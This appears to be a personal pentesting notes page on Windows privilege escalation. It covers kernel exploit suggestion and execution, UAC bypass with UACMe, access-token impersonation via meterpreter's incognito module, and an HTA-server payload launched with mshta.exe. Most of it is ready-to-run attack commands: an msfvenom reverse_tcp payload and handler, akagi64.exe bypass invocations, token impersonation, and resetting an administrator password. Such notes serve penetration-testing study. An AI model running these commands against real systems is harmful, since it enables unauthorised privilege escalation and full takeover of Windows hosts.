---
title: 'Windows'
description: ''
pubDate: 'Jul 03 2022'
slug: 'escalation/windows'
---

# kernel exploit

Metasploit module to identify kernel exploits
**_multi/recon/local_exploit_suggester_**

```bash
# windows-exploit suggester github

# With an active session, to get win7.txt systeminfo from target.
./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt
...
windows version identifiedas 'windows ....'
MS16-135:
...

# Upload our payload windows-kernel-exploit/MS16-135/41015.exe into tmp directory

# -EXEC-
./41015.exe
```

# Bypassing UAC (User Account Control) with UACMe

- It abuses the built-in Windows AutoElevate executables.

- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.

- https://github.com/hfiref0x/UACME

- If the configuration setting is set highly its hard to by pass.

- User must be a local administrator group.

```bash
# Generate our payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=target LPORT=1234 -f exe > door.exe

# msfconsole, listening...
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST target
set LPOT 1234
run

#In other session upload evil-payload if meterpreter session
upload /root/akagi64.exe

# specifiet where is our payload
./akagi64.exe 23 C:\Temp\door.exe
```

```bash
# msfconsole, example of a denied service.
sysinfo
pgrep explorer
migrate $id
sysinfo
getuid
getprivs
shell
net user
net localgroup administrators
net user admin passwrod123
```

# Windows Access Tokens

- A core element of the authentication process on windows and are created and managed by the Local Security Authority Subsystem Service (LSASS).

## Information

Are generated by the winlogon.exe process every time a user auth successfully and includes the identify and privileges of the user acc associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token.

- **Impersonate-level token:** Created as direct result of a non-interactive login on windows, typically through specific system services or domain logons, This tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token.

- **Delegate-level Token:** Created through an interactive login on windows, primarily through a traditional login or through remote access protocols such as RDP. Pose the largest threat as they can be used to impersonate tokens on any system.

```bash
required privileges
# SeAssignPrimaryToken:
# SeCreateToken:
# SelmpersonatePrivilege:
```

## Exploit

```bash
# meterpreter
systeminfo
pgrep explorer
migrate pgred_explorer_id
getprivs

# Start attack - incognito
load incognito

# if there is no token use potato attack
list_tokens -u

#copy delegation tokens available
impersonate_token "token\Administrator"
getuid
getprivs
pgrep explorer
migrate id
getprivs

getuid # The administrator acc

```

## PowerShell command to bypass the default execution policy when running PowerShell scripts | PrivescCheck

```bash
# powershell -ep bypass .\script.ps1

# runas.exe /user:administrator cmd

### Kali
use exploit/windows/misc/hta_server
exploit

# Copy the local link and execute on cmd  with mshta.exe
mshta.exe http://link_generated_by_metasploit/hash

```
